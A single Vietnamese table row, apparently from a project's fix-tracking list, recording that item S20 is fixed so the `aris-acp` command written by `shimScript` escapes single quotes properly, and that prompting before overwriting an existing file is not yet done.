| S20 | Đã sửa | Lệnh `aris-acp` ghi bằng `shimScript` thoát nháy đơn đúng cách. Chưa làm: hỏi trước khi ghi đè tệp có sẵn. |
